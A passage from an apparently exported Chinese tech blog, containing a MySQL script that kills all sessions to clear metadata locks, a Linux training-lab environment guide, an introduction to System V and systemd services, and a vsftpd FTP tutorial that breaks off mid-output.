<h2 id="MDL故障自愈"><a href="#MDL故障自愈" class="headerlink" title="MDL故障自愈"></a>MDL故障自愈</h2><h3 id="kill所有会话"><a href="#kill所有会话" class="headerlink" title="kill所有会话"></a>kill所有会话</h3><blockquote>
<p>不想知道故障原因，只想快速解决故障</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>掉 所有会话</span></span><br><span class="line">user=xxx</span><br><span class="line">password=xxx</span><br><span class="line">host=xxxx.mysql.rds.aliyuncs.com</span><br><span class="line">port=3306</span><br><span class="line"></span><br><span class="line">mysql -u$user -p$password -h$host  -P$port -e "select  concat('KILL ',id,';') from information_schema.processlist;" &gt; tmpfile</span><br><span class="line"></span><br><span class="line">awk '&#123;if (NR != 1) print $0 &#125;' tmpfile | mysql -u$user -p$password -h$host  -P$port</span><br></pre></td></tr></table></figure>

<h3 id="MDL故障排查和解决"><a href="#MDL故障排查和解决" class="headerlink" title="MDL故障排查和解决"></a>MDL故障排查和解决</h3><p><a href="https://github.com/BoobooWei/DevOps-Database-Troubleshooting/blob/master/fault_self_healing_metadatalock.py" target="_blank" rel="noopener">MDL故障自愈脚本GitHub地址</a></p>
]]></content>
      <categories>
        <category>技术广角</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>锁故障</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX 基础服务课程环境使用说明</title>
    <url>/2016/12/23/booboo_easy_service/00_linux_classroom_env/</url>
    <content><![CDATA[<p>UP100 课程基于RHEL6.5、RHEL7.0、ubuntu1604、WindowsXP和Windows2012R2系统</p>
<p>需要开启虚拟机可以直接双击图标，第一次启动时将从讲师机下载映像文件，可能会比较慢。</p>
<p>控制虚拟机可以使用kiosk用户，执行rht-vmctl命令，请自行查看命令使用。</p>
<h3 id="授课网络环境配置如下"><a href="#授课网络环境配置如下" class="headerlink" title="授课网络环境配置如下"></a>授课网络环境配置如下</h3><p><strong>f0~fN</strong>为教室物理机，其域名为<code>foundationN.ilt.example.com</code> ,可简写为<code>fN</code>。其IP为<code>172.25.N.250</code>，<code>f0</code>特殊为<code>172.25.254.250</code>。</p>
<p><code>classroom</code>虚拟机为所有物理机和虚拟机的默认网关，配置了多个网卡设置了所有<code>172.25.N.254</code>的地址，保证虚拟机、物理机和各个学生机之间的路由。配置了<code>DHCP</code>、<code>DNS</code>和<code>HTTP</code>服务，其域名为<code>classroom.example.com</code>可简写为<code>classroom</code>。</p>
<p>rhel6虚拟机均安装RHEL6.5系统，rhel7虚拟机均安装RHEL7.0系统，ubuntu1604虚拟机均安装Ubuntu1604系统，均安装图形化界面并配置runlevel 5启动，root密码为uplooking ，配置了基础的YUM源指向classroom， rhel6、rhel7、ubuntu1604、winxp和win2012r2虚拟机均配置了1块虚拟机网卡，eth0接入物理机br0网桥，动态获得ip地址:</p>
<table>
<thead>
<tr>
<th align="left">hostname</th>
<th align="left">ipaddr</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rhel7</td>
<td align="left">172.25.N.10</td>
</tr>
<tr>
<td align="left">rhel6</td>
<td align="left">172.25.N.11</td>
</tr>
<tr>
<td align="left">winxp</td>
<td align="left">172.25.N.12</td>
</tr>
<tr>
<td align="left">ubuntu</td>
<td align="left">172.25.N.14</td>
</tr>
<tr>
<td align="left">win2012r2</td>
<td align="left">172.25.N.15</td>
</tr>
</tbody></table>
<p>rhel6、rhel7、ubuntu1604虚拟机均配置两块虚拟硬盘vda和vdb，以方便授课演示。除winxp和win2012r2之外其它虚拟机均配置2GB运行内存，winxp配置1GB运行内存，win2012r2配置4GB运行内存。</p>
<p>winxp虚拟机主机上安装了如下软件：</p>
<ul>
<li>Cisco Packet Tracer</li>
<li>Putty</li>
<li>Winscp</li>
<li>Xshell</li>
<li>Wireshark</li>
<li>Navicat for Mysql</li>
<li>Microsoft Visio 2010</li>
<li>7-zip</li>
</ul>
<p>已在classroom上完成DNS配置，正向和方向域名及邮件代理域名和虚拟机域名设置如下：</p>
<p>rhel7主机：172.25.N.10</p>
<ul>
<li>rhel7-fN.example.com</li>
<li>dN.example.com</li>
<li>imapN.example.com</li>
<li>smtpN.example.com (MX)</li>
</ul>
<p>rhel6主机： 172.25.N.11</p>
<ul>
<li>rhel6-fN.example.com</li>
<li>sN.example.com</li>
<li>wwwN.example.com</li>
<li>webapp-fN.example.com</li>
</ul>
<p>winxp主机： 172.25.N.12</p>
<ul>
<li>winxp-fN.example.com</li>
<li>install 主机：172.25.N.13</li>
<li>install-fN.example.com</li>
<li>ubuntu主机：172.25.N.14</li>
<li>ubuntu-fN.example.com</li>
</ul>
<p>win2012r2主机：172.25.N.15</p>
<ul>
<li>win2012r2-fN.example.com</li>
</ul>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>rhel6.5 SElinux有bug，光盘中默认没有selinux相关manpage，看manpage需要安装selinux-policy-doc包，但这个包需要从RHN下载。</p>
<h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><p><img src="pic/01-up100.png" alt="up100"></p>
<hr>
<h2 id="基础服务简介"><a href="#基础服务简介" class="headerlink" title="基础服务简介"></a>基础服务简介</h2><p>本章将讲解以下内容：</p>
<ul>
<li>RHEL6 中Linux系统服务的基础知识、System V与Xinetd的概念，以及通过 servcie 命令来启动某一服务，通过 chkconfig 命令来设置服务是否开机启动</li>
<li>RHEL7 中 已经替换掉 System V init，并正式采用全新的初始化进程 Systemd，以及通过systemctl 命令来启动某一服务和设置该服务是否开机启动</li>
</ul>
<blockquote>
<p>重点简介rhel6，rhel7只做命令的介绍，具体内容请参考《systemd说明》</p>
</blockquote>
<h3 id="系统服务的基本概念"><a href="#系统服务的基本概念" class="headerlink" title="系统服务的基本概念"></a>系统服务的基本概念</h3><p>服务，其实就是运行在操作系统后台的一个或者多个应用程序，为计算机系统或用户提供某项特定的服务。</p>
<p>在我们的windows操作系统中，其在后台也运行了许许多多的服务。例如我们装的杀毒软件，其在后台运行了许多我们看不见的服务程序，通过这些服务来为用户或者计算机系统来提高特定的功能。</p>
<p>服务通常是不中断运行的，随时准备接受请求，从而提供某项服务。例如我们日常使用的网页服务，其就是由一个运行在所访问网站的服务器上的httpd服务提供的服务，我们通过在浏览器输入需要访问网站的域名，服务器端的httpd服务就会随时的接收我们发送过来的请求，并响应回给我们的用户。</p>
<p>我们Linux系统绝大多数服务都是网络服务，例如邮件服务、FTP服务、httpd服务等等，网络服务可以使为其他用户、其他计算机提供特定的服务。</p>
<h3 id="services-和-daemons"><a href="#services-和-daemons" class="headerlink" title="services 和 daemons"></a>services 和 daemons</h3><table>
<thead>
<tr>
<th align="left">服务名</th>
<th align="left">守护进程名</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rsyslog</td>
<td align="left">rsyslogd</td>
</tr>
<tr>
<td align="left">atd</td>
<td align="left">atd</td>
</tr>
<tr>
<td align="left">crond</td>
<td align="left">crond</td>
</tr>
</tbody></table>
<p><strong>服务的分类</strong> 服务名通常有两个，一个这个基于程序的服务名称，我们把它叫做service，比如说ftp服务，samba服务等等。<br>还有一个是基于进程的服务名称，我们通常把它叫做daemon，守护进程，也就是我们使用ps命令时候看到的名称，比如httpd，比如named之类的等等，一般服务的进程名都是程序名称后加上一个d，当然也有不少的特例。之后我们都会一一去说这些服务。</p>
<h3 id="基于-daemon-分类"><a href="#基于-daemon-分类" class="headerlink" title="基于 daemon 分类"></a>基于 daemon 分类</h3><p>那么根据daemon，也就是守护进程，我们可以把服务分成两类，一类是独立启动的服务，叫做stand alone daemon，我们之后学的服务基本上都是独立启动的服务。另外一种叫做super daemon。我们分开来来说一下这两种服务的特征。</p>
<ul>
<li>1&gt; stand alone daemon 独立启动服务</li>
<li>2&gt; super daemon 超级服务 xinted</li>
</ul>
<h4 id="System-V"><a href="#System-V" class="headerlink" title="System V"></a>System V</h4><p>总的来说，Linux系统通常作为服务器端的操作系统来用的，所以Linux系统提供了许许多的的服务，有些服务需要我们自己来进行配置，这些服务的目的就是为了给我们的计算机、用户提供某项特定的功能。那么对于各种不同的服务，Linux系统是怎么样来统一进行管理的呢？</p>
<p>在Linux操作系统中，Linux对于服务的管理体系是沿用了System V的服务管理体系，System V原来是早期AT&amp;T的一个操作系统。</p>
<p>对于Linux系统，System V提供了运行级别的概念，还记得之前一直提到过的Linux的启动运行级别吗？没错，System V一共提供了7种运行级别</p>
<p>0   关机</p>
<p>1   单用户模式</p>
<p>2   不带网络的多用户模式</p>
<p>3   带网络的多用户模式，纯文本界面</p>
<p>4   未使用</p>
<p>5   带网络的多用户模式，图形界面</p>
<p>6   重启</p>
<p>对于我们来说，通常使用的是级别3和级别5，每个级别下都有对应的启动、不启动的服务，比如单用户模式下，所有的服务都是不启动，这些都是通过System V这个服务管理体系来决定的</p>
<p>System V定义了init为系统启动的第一个进程，进程PID=1，这个进程的目的就是去查看 /etc/inittab 中的系统启动级别从而来启动对应的服务</p>
<p>对于不同的服务，因为其提供该服务的厂家不同，所以这些的服务的启动、关闭机制通常不同，在Linux系统中，为了方便的管理这些服务，每个服务的启动、结束、重启等操作都由一个System V脚本来进行控制，拥有固定的格式。</p>
<p>对于Linux系统上的服务，这些服务的System V脚本文件都是存放在 /etc/rc.d/init.d 这个目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# cd /etc/rc.d/init.d/</span><br><span class="line">[root@rhel6 ~]# ls</span><br><span class="line">abrt-ccpp         firstboot     messagebus      quota_nld    snmptrapd</span><br><span class="line">abrtd             functions     mysqld          rdisc        spice-vdagentd</span><br><span class="line">abrt-oops         haldaemon     netconsole      restorecond  sshd</span><br><span class="line">acpid             halt          netfs           rngd         sssd</span><br><span class="line">atd               htcacheclean  network         rpcbind      sysstat</span><br><span class="line">auditd            httpd         NetworkManager  rpcgssd      udev-post</span><br><span class="line">autofs            ip6tables     nfs             rpcidmapd    vboxadd</span><br><span class="line">blk-availability  iptables      nfslock         rpcsvcgssd   vboxadd-service</span><br><span class="line">bluetooth         irqbalance    ntpd            rsyslog      vboxadd-x11</span><br><span class="line">certmonger        kdump         ntpdate         sandbox      vncserver</span><br><span class="line">cpuspeed          killall       oddjobd         saslauthd    wdaemon</span><br><span class="line">crond             lvm2-lvmetad  portreserve     single       winbind</span><br><span class="line">cups              lvm2-monitor  postfix         smartd       wpa_supplicant</span><br><span class="line">dnsmasq           mdmonitor     psacct          snmpd        ypbind</span><br></pre></td></tr></table></figure>

<p>我们看到在这个目录下，存在了许多纯文本文件，这些文件都是系统每一个服务的System V的脚本文件，对于该脚本文件，我们要启动什么服务，都是通过这些脚本文件来启动的，我们也可以通过编写System V脚本文件来手工创建一个我们自己的由System V来控制的服务。</p>
<p>对于Linux的所有的这些服务，我们通过 service 这个命令来进行统一的管理</p>
<p>命令 service 可以调用指定服务的System V脚本，并执行指定的动作</p>
<p><code>service 服务名 [start | stop | restart | status]</code></p>
<p>对于Linux系统的这些服务，我们都是通过 service 这个命令去调用该服务对应的System V脚本，并执行其指定的动作</p>
<p>刚才我们也说到了，System V定义了运行级别的概念，每个运行级别对应有启动、不启动的服务，在 <code>/etc/rc.d</code> 这个目录下，除了我们刚才的 init.d 这个目录，我们还发现还有其它的一些目录，诸如 rc0.d、rc1.d等这些目录就分别对应了系统的7中启动级别，每个目录里面都存放了许多的<br>文件，每个文件对应着一个特定的服务，并标志有是否开机启动以及启动顺序。</p>
<p>我们发现，在这些目录里面，存放的都是链接文件，不过这每一个链接文件的名字都有着严格的规定。每一个链接文件都由3部分组成</p>
<p><code>K15httpd -&gt; ../init.d/httpd　　　　S55sshd -&gt; ../init.d/sshd</code></p>
<ul>
<li>①第一个部分是第一个字母K或者S，表示该服务是不是是不是开机自动启动，K表示开机不启动，S表示开机就启动</li>
<li>②第二个部分是一个数字，这个数字代表的是该服务的启动顺序，服务启动的顺序非常的重要，例如我们的网络服务需要在邮件服务之前启动</li>
<li>③第三个部分就是对应服务的名字，该链接文件其实都是指向的是 init.d 这个目录下的System V脚本文件</li>
</ul>
<p>我们如果希望某服务开机就启动，可以通过修改 rc5.d 目录下的链接文件，不过这样做很麻烦，Linux系统提供了一个 <code>chkconfig</code> 命令可以来设置服务是否开机启动</p>
<p>我们通过 <code>chkconfig --list</code> 命令来查看所有服务的开机启动情况</p>
<p>比如我们需要设置 network 服务开启自动启动，可以使用 <code>chkconfig httpd on</code> 命令即可</p>
<p>比如我们需要设置 network 服务开启不启动，可以使用 <code>chkconfig httpd off</code> 命令即可</p>
<h4 id="xinetd"><a href="#xinetd" class="headerlink" title="xinetd"></a>xinetd</h4><p>其实对于上面通过 System V来管理的一些服务都属于Linux系统的常驻运行的服务，其实在Linux系统中还有许多不常驻的一些服务，例如 telnet、rsync服务，这些服务则是通过 xinetd 这个服务来进行管理的。</p>
<p>xinetd 控制的就是那些不常驻的服务，功能较为简单的服务</p>
<p>xinetd其实自己本身就是作为一个系统的常驻的服务运行在后台，而xinetd所控制的服务在没有连接请求的时候是不运行的，所有xinetd控制的服务的连接请求都会提交给xinetd来进行代理</p>
<p>xinetd在收到一个请求后，会根据请求的协议及服务启动相应的服务进程，进程处理完后请求就会结束</p>
<p>xinetd本身就是一个系统服务，通过 System V来对其进行管理，在CentOS6/RHEL6中，xinetd服务默认是没有安装的，我们若要使用该服务，首先需要安装它<code>yum install xinetd</code></p>
<p>在我们安装好我们的<code>xinetd</code>服务以后，我们这时再通过 <code>chkconfig --list</code> 命令来查看所有的服务启动设置</p>
<p>我们看到，在安装了xinetd服务以后，其下面出现了一些其他的服务选项，例如<code>rsync</code>，<code>chargen-dgram</code>等这些服务，这些服务都是系统的一些不常驻服务，都是通过xinetd这个服务来对其进行管理的</p>
<p><code>xinetd</code>服务的配置文件是 <code>/etc/xinetd.conf</code></p>
<h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><ul>
<li>查看 <code>netstat -luntp</code></li>
<li>软件名    <code>net-tools</code></li>
</ul>
<h3 id="基础服务总结"><a href="#基础服务总结" class="headerlink" title="基础服务总结"></a>基础服务总结</h3><p><strong>RHEL 6</strong></p>
<p>服务的启动 停止 重启 状态    <code>service 服务名 [start | stop | restart | status]</code></p>
<p>服务开机启动状态        <code>chkconfig --list</code></p>
<p>设置服务开机启动        <code>chkconfig 服务名 on</code></p>
<p>设置服务开机不启动        <code>chkconfig 服务名 off</code></p>
<p><strong>RHEL 7</strong></p>
<p>服务的启动 停止 重启 状态    <code>systemctl [start | stop | restart | status] 服务名</code></p>
<p>设置服务开机启动        <code>systemctl enable 服务名</code></p>
<p>设置服务开机不启动        <code>systemctl disable 服务名</code></p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>FTP文件共享服务</title>
    <url>/2016/12/23/booboo_easy_service/02_ftp/</url>
    <content><![CDATA[<blockquote>
<p>课程要求</p>
</blockquote>
<ol>
<li>设置vsftpd服务匿名用户能够对/var/ftp/pub/目录有上传下载的权限。</li>
<li>系统用户能够访问家目录，上传下载删除</li>
<li>除了系统用户student有chroot的权限，其他系统用户没有chroot的权限</li>
</ol>
<h3 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a>FTP服务</h3><p>FTP 是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于<br>Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有<br>不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两<br>个概念：”下载”（Download）和”上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机<br>上；”上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程<br>序向（从）远程主机上传（下载）文件。</p>
<h3 id="FTP原理"><a href="#FTP原理" class="headerlink" title="FTP原理"></a>FTP原理</h3><p>FTP只通过TCP连接,没有用于FTP的UDP组件。</p>
<p>FTP不同于其他服务的是它使用了两个端口, 一个数据端口和一个命令端口(或称为控制端口)。</p>
<p>通常21端口是命令端口，20端口是数据端口。当混入主动/被动模式的概念时，数据端口就有可能不是20了。</p>
<p><strong>工作模式</strong> FTP支持两种模式：</p>
<ul>
<li>Standard (PORT方式，主动方式)</li>
<li>Passive (PASV，被动方式)。</li>
</ul>
<p><strong>Port模式</strong></p>
<p>主动模式下，FTP客户端从任意的非特殊的端口（N &gt; 1023）连入到FTP服务器的命令端口–21端口。然后客户端在N+1（N+1 &gt;= 1024）端口监听，并且通过N+1（N+1 &gt;= 1024）端口发送命令给FTP服务器。服务器会反过来连接用户本地指定的数据端口，比如20端口。</p>
<p>以服务器端防火墙为立足点，要支持主动模式FTP需要打开如下交互中使用到的端口：</p>
<ul>
<li>FTP服务器命令（21）端口接受客户端任意端口（客户端初始连接）</li>
<li>FTP服务器命令（21）端口到客户端端口（&gt;1023）（服务器响应客户端命令）</li>
<li>FTP服务器数据（20）端口到客户端端口（&gt;1023）（服务器初始化数据连接到客户端数据端口）</li>
<li>FTP服务器数据（20）端口接受客户端端口（&gt;1023）（客户端发送ACK包到服务器的数据端口）</li>
</ul>
<p>用图表示如下：</p>
<p><img src="pic/15.jpg" alt="15"></p>
<p>在第1步中，客户端的命令端口与FTP服务器的命令端口建立连接，并发送命令“PORT 1027”。然后在第2步中，FTP服务器给客户端的命令端口返回一个”ACK”。在第3步中，FTP服务器发起一个从它自己的数据端口（20）到客户端先前指定的数据端口（1027）的连接，最后客户端在第4步中给服务器端返回一个”ACK”。</p>
<p>主动方式FTP的主要问题实际上在于客户端。FTP的客户端并没有实际建立一个到服务器数据端口的连接，它只是简单的告诉服务器自己监听的端口号，服务器再回来连接客户端这个指定的端口。对于客户端的防火墙来说，这是从外部系统建立到内部客户端的连接，这是通常会被阻塞的。</p>
<p><strong>Passive模式</strong></p>
<p>为了解决服务器发起到客户的连接的问题，人们开发了一种不同的FTP连接方式。这就是所谓的被动方式，或者叫做PASV，当客户端通知服务器它处于被动模式时才启用。</p>
<p>在被动方式FTP中，命令连接和数据连接都由客户端，这样就可以解决从服务器到客户端的数据端口的入方向连接被防火墙过滤掉的问题。当开启一个FTP连接时，客户端打开两个任意的非特权本地端口（N &gt;; 1024和N+1）。第一个端口连接服务器的21端口，但与主动方式的FTP不同，客户端不会提交PORT命令并允许服务器来回连它的数据端口，而是提交PASV命令。这样做的结果是服务器会开启一个任意的非特权端口（P &gt;; 1024），并发送PORT P命令给客户端。然后客户端发起从本地端口N+1到服务器的端口P的连接用来传送数据。</p>
<p>对于服务器端的防火墙来说，必须允许下面的通讯才能支持被动方式的FTP:</p>
<ul>
<li>FTP服务器命令（21）端口接受客户端任意端口（客户端初始连接）</li>
<li>FTP服务器命令（21）端口到客户端端口（&gt;1023）（服务器响应客户端命令）</li>
<li>FTP服务器数据端口（&gt;1023）接受客户端端口（&gt;1023）（客户端初始化数据连接到服务器指定的任意端口）</li>
<li>FTP服务器数据端口（&gt;1023）到客户端端口（&gt;1023）（服务器发送ACK响应和数据到客户端的数据端口）</li>
</ul>
<p>用图表示如下：</p>
<p><img src="pic/16.jpg" alt="16"></p>
<p>在第1步中，客户端的命令端口与服务器的命令端口建立连接，并发送命令“PASV”。然后在第2步中，服务器返回命令”PORT 2024”，告诉客户端（服务器）用哪个端口侦听数据连接。在第3步中，客户端初始化一个从自己的数据端口到服务器端指定的数据端口的数据连接。最后服务器在第4 步中给客户端的数据端口返回一个”ACK”响应。</p>
<p>被动方式的FTP解决了客户端的许多问题，但同时给服务器端带来了更多的问题。最大的问题是需要允许从任意远程终端到服务器高位端口的连接。幸运的是，许多FTP守护程序，包括流行的WU-FTPD允许管理员指定FTP服务器使用的端口范围。详细内容参看附录1。</p>
<p>第二个问题是客户端有的支持被动模式，有的不支持被动模式，必须考虑如何能支持这些客户端，以及为他们提供解决办法。例如，Solaris提供的FTP命令行工具就不支持被动模式，需要第三方的FTP客户端，比如ncftp。</p>
<p>随着WWW的广泛流行，许多人习惯用web浏览器作为FTP客户端。大多数浏览器只在访问ftp://这样的URL时才支持被动模式。这到底是好还是坏取决于服务器和防火墙的配置。</p>
<p>下面的图表会帮助管理员们记住每种FTP方式是怎样工作的：</p>
<p><strong>主动FTP：</strong></p>
<ol>
<li>命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口</li>
<li>数据连接：客户端 &gt;1023端口 &lt;- 服务器 20端口</li>
</ol>
<p><strong>被动FTP：</strong></p>
<ol>
<li>命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口</li>
<li>数据连接：客户端 &gt;1023端口 -&gt; 服务器 &gt;1023端口</li>
</ol>
<p>下面是主动与被动FTP优缺点的简要总结：</p>
<p>主动FTP对FTP服务器的管理有利，但对客户端的管理不利。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙阻塞掉。被动FTP对FTP客户端的管理有利，但对服务器端的管理不利。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。</p>
<p>幸运的是，有折衷的办法。既然FTP服务器的管理员需要他们的服务器有最多的客户连接，那么必须得支持被动FTP。我们可以通过为FTP服务器指定一个有限的端口范围来减小服务器高位端口的暴露。这样，不在这个范围的任何端口会被服务器的防火墙阻塞。虽然这没有消除所有针对服务器的危险，但它大大减少了危险。</p>
<h3 id="VSFTPD-软件"><a href="#VSFTPD-软件" class="headerlink" title="VSFTPD 软件"></a>VSFTPD 软件</h3><p>如果你想在你的Linux/Unix服务器上搭建一个安全、高性能、稳定性好的FTP服务器，那么vsftpd可能是你的首选应用。vsftpd意思为“very secure FTP daemon(非常安全的FTP进程)”，是一个基于GPL发布的类UNIX类操作系统上运行的服务器的名字（是一种守护进程），可以运行在诸如Linux、BSD、Solaris、HP-UX以及Irix等系统上面。vsftpd支持很多其他传统的FTP服务器不支持的良好特性。</p>
<p>最新的vsftpd版本可在其官网获取：<a href="www.vsftpd.org">www.vsftpd.org</a></p>
<p>vsftpd 是“very secure FTP daemon”的缩写，安全性是它的一个最大的特点。vsftpd 是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux、BSD、Solaris、 HP-UNIX等系统上面，是一个完全免费的、开发源代码的ftp服务器软件，支持很多其他的 FTP 服务器所不支持的特征。比如：非常高的安全性需求、带宽限制、良好的可伸缩性、可创建虚拟用户、支持IPv6、速率高等。</p>
<p>看看都有哪些网站在使用vsftpd吧：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp.RedHat.com</span><br><span class="line">ftp.SUSE.com</span><br><span class="line">ftp.debian.org</span><br><span class="line">ftp.openbsd.org</span><br><span class="line">ftp.freebsd.org</span><br><span class="line">ftp.gnu.org</span><br><span class="line">ftp.gnome.org</span><br><span class="line">ftp.kde.org</span><br><span class="line">ftp.kernel.org</span><br><span class="line">rpmfind.net</span><br><span class="line">ftp.linux.org.uk</span><br><span class="line">ftp.gimp.org</span><br><span class="line">ftp-stud.fht-esslingen.de</span><br><span class="line">gd.tuwien.ac.at</span><br><span class="line">ftp.sunet.se</span><br><span class="line">ftp.ximian.com</span><br><span class="line">ftp.engardelinux.org</span><br><span class="line">ftp.sunsite.org.uk</span><br><span class="line">ftp.isc.org</span><br></pre></td></tr></table></figure>

<h4 id="什么是vsftpd"><a href="#什么是vsftpd" class="headerlink" title="什么是vsftpd"></a>什么是vsftpd</h4><p>Vsftpd是一种在GPL许可下开放源代码的FTP服务器，用于多种UNIX系统和Linux系统。Vsftpd也称为Very Secure FTP Daemon，它是一种安全、快速、稳定的FTP服务器，能够高效地处理大量的并发连接。</p>
<p>Vsftpd的主要特点包括：</p>
<ul>
<li>提供安全的体系结构，根据任务的最低特权需求单独执行每个任务。</li>
<li>支持虚拟IP配置，可以在提供一个IP地址的情况下，在域中用该地址建立多个FTP服务器。</li>
<li>允许配置并使用虚拟用户，从而与系统用户账户分离。</li>
<li>支持TCP封装。</li>
<li>允许配置匿名服务器，用户可以在不需要身份验证的情况下上传和下载文件。</li>
<li>性能稳定，可以处理大量的并发连接。</li>
<li>可以配置为独立的服务器。</li>
<li>Vsftpd服务器支持带宽控制。</li>
</ul>
<blockquote>
<p>用户类型</p>
</blockquote>
<p><strong>r 真实用户</strong></p>
<p>这类用户是指在FTP服务上拥有帐号，即/etc/passwd里的用户。当这类用户登录FTP服务器的时候，其默认的主目录就是其帐号命名的目录。但是，其还可以变更到其他目录中去。如系统的主目录等等。</p>
<p><strong>g 来宾用户</strong></p>
<p>在vsFTP软件里没有这类用户，但是在FTP服务器中有，我们往往会给不同的部门或者某个特定的用户设置一个帐户。但是，这个账户有个特点，就是其只能够访问自己的主目录。服务器通过这种方式来保障FTP服务上其他文件的安全性。这类帐户，在Vsftpd软件中就叫做Guest用户。拥有这类用户的帐户，只能够访问其主目录下的目录，而不得访问主目录以外的文件。</p>
<p><strong>a 匿名用户</strong></p>
<p>Anonymous（匿名）用户，这也是我们通常所说的匿名访问。这类用户是指在FTP服务器中没有指定帐户，但是其仍然可以进行匿名访问某些公开的资源。<br>在组建FTP服务器的时候，我们就需要根据用户的类型，对用户进行归类。默认情况下，Vsftpd服务器会把建立的所有帐户都归属为Real用户。但是，这往往不符合企业安全的需要。因为这类用户不仅可以访问自己的主目录，而且，还可以访问其他用户的目录。这就给其他用户所在的空间带来一定的安全隐患。所以，企业要根据实际情况，修改用户所在的类别。</p>
<hr>
<h4 id="项目实践1-设置vsftpd服务匿名用户能够对-var-ftp-pub-目录有上传下载的权限"><a href="#项目实践1-设置vsftpd服务匿名用户能够对-var-ftp-pub-目录有上传下载的权限" class="headerlink" title="项目实践1: 设置vsftpd服务匿名用户能够对/var/ftp/pub/目录有上传下载的权限"></a>项目实践1: 设置vsftpd服务匿名用户能够对/var/ftp/pub/目录有上传下载的权限</h4><h5 id="实验准备阶段"><a href="#实验准备阶段" class="headerlink" title="实验准备阶段"></a>实验准备阶段</h5><ol>
<li>网络拓扑图</li>
<li>规划软件安装</li>
<li>修改配置文件</li>
<li>启动服务</li>
<li>注意防火墙关闭</li>
<li>客户端测试服务        </li>
</ol>
<blockquote>
<p>网络拓扑图</p>
</blockquote>
<p><img src="pic/17.png" alt="17"></p>
<blockquote>
<p>规划软件安装</p>
</blockquote>
<p><img src="pic/18.png" alt="18"></p>
<h5 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h5><p>Linux几乎所有的发行版本都内置了Vsftpd服务。</p>
<p><strong>服务器端rhel6</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# yum install -y vsftpd</span><br><span class="line">Loaded plugins: product-id, refresh-packagekit, security, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">Setting up Install Process</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package vsftpd.x86_64 0:2.2.2-11.el6_4.1 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">=============================================================================================</span><br><span class="line"> Package            Arch               Version                      Repository          Size</span><br><span class="line">=============================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> vsftpd             x86_64             2.2.2-11.el6_4.1             server             151 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=============================================================================================</span><br><span class="line">Install       1 Package(s)</span><br><span class="line"></span><br><span class="line">Total download size: 151 k</span><br><span class="line">Installed size: 331 k</span><br><span class="line">Downloading Packages:</span><br><span class="line">vsftpd-2.2.2-11.el6_4.1.x86_64.rpm                                    | 151 kB     00:00     </span><br><span class="line">Running rpm_check_debug</span><br><span class="line">Running Transaction Test</span><br><span class="line">Transaction Test Succeeded</span><br><span class="line">Running Transaction</span><br><span class="line">  Installing : vsftpd-2.2.2-11.el6_4.1.x86_64                                            1/1</span><br><span class="line">  Verifying  : vsftpd-2.2.2-11.el6_4.1.x86_64                                            1/1</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  vsftpd.x86_64 0:2.2.2-11.el6_4.1                                                           </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# service iptables stop</span><br><span class="line">iptables: Setting chains to policy ACCEPT: filter          [  OK  ]</span><br><span class="line">iptables: Flushing firewall rules:                         [  OK  ]</span><br><span class="line">iptables: Unloading modules:                               [  OK  ]</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# getenforce</span><br><span class="line">Enforcing</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# rpm -q vsftpd</span><br><span class="line">vsftpd-2.2.2-11.el6_4.1.x86_64</span><br><span class="line">[root@rhel6 ~]# rpm -ql vsftpd</span><br><span class="line">/etc/logrotate.d/vsftpd</span><br><span class="line">/etc/pam.d/vsftpd</span><br><span class="line">/etc/rc.d/init.d/vsftpd</span><br><span class="line">/etc/vsftpd</span><br><span class="line">/etc/vsftpd/ftpusers</span><br><span class="line">/etc/vsftpd/user_list</span><br><span class="line">/etc/vsftpd/vsftpd.conf</span><br><span class="line">/etc/vsftpd/vsftpd_conf_migrate.sh</span><br><span class="line">/usr/sbin/vsftpd</span><br><span 